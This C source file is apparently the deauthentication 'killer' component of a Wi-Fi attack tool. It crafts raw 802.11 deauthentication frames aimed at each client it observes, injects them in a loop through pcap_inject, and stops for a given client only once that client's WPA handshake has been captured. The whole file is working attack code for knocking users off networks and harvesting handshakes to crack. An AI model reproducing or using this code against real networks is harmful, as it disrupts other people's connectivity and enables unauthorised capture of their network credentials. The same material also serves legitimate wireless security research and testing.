#include <unistd.h>
#include <string.h>
#include "debug.h"
#include "killer.h"

#define DEAUTHENTICATION_PACKET_SIZE 34
#define DEAUTHENTICATION_PACKET                         \
    /* radiotap */                                      \
    "\x00"                     /* version */            \
    "\x00"                     /* padding */            \
    "\x08\x00"                 /* length */             \
    "\x00\x00\x00\x00"         /* present */            \
    /* ieee80211_mac */                                 \
    "\xc0\x00"                 /* frame control */      \
    "\x00\x00"                 /* duration */           \
    "\x00\x00\x00\x00\x00\x00" /* destination */        \
    "\x00\x00\x00\x00\x00\x00" /* source */             \
    "\x00\x00\x00\x00\x00\x00" /* bssid */              \
    "\x00\x00"                 /* sequence control */   \
    "\x07\x00"                 /* reason */

static int zz_deauthenticate(zz_t *zz) {
    GHashTableIter i;
    const ieee80211_addr_t client_addr;
    const uint8_t *packet;

    /* scan hashtable */
    for (g_hash_table_iter_init(&i, zz->kill_list);
         g_hash_table_iter_next(&i, (void *)&client_addr, (void *)&packet);) {
        struct ieee80211_mac_header *mac_header;
        uint16_t seq;

        if (zz->setup.verbose) {
            char client_addr_str[18];
            ieee80211_addr_sprint(client_addr, client_addr_str);
            PRINTF("deauthenticating client %s", client_addr_str);
        }

        /* send packet */
        if (pcap_inject(zz->handler, packet,
                        DEAUTHENTICATION_PACKET_SIZE) == -1) {
            zz_set_error_messagef(zz, "cannot send deauthentication packet");
            return 0;
        }

        /* increment sequence number */
        mac_header = (struct ieee80211_mac_header *)
            (packet + sizeof(struct ieee80211_radiotap_header));
        seq = le16toh(mac_header->sequence_control);
        seq = (((seq >> 4) + 1) % 0xfff) << 4;
        mac_header->sequence_control = htole16(seq);
    }

    return 1;
}

int zz_start_killer(zz_t *zz) {
    struct zz_killer_message message;

    PRINT("waking up killer");

    /* while there are pending messages */
    while (read(zz->comm[0], &message,
                sizeof(struct zz_killer_message)) > 0) {
        switch (message.action) {
        case ZZ_NEW_CLIENT: {
            struct ieee80211_mac_header *mac_header;
            u_char *packet;

            /* craft packet */
            packet = g_memdup(DEAUTHENTICATION_PACKET,
                              DEAUTHENTICATION_PACKET_SIZE);
            mac_header = (struct ieee80211_mac_header *)
                (packet + sizeof(struct ieee80211_radiotap_header));
            memcpy(mac_header->address_1, message.client, 6);
            memcpy(mac_header->address_2, message.bssid, 6);
            memcpy(mac_header->address_3, message.bssid, 6);

            /* save it in the hashtable */
            g_hash_table_insert(zz->kill_list,
                                g_memdup(message.client, 6), packet);
            break;
        }

        case ZZ_HANDSHAKE:
            /* stop deauthenticating it */
            g_hash_table_remove(zz->kill_list, message.client);
            break;
        }
    }

    /* send deauthentication packets */
    return zz_deauthenticate(zz);
}
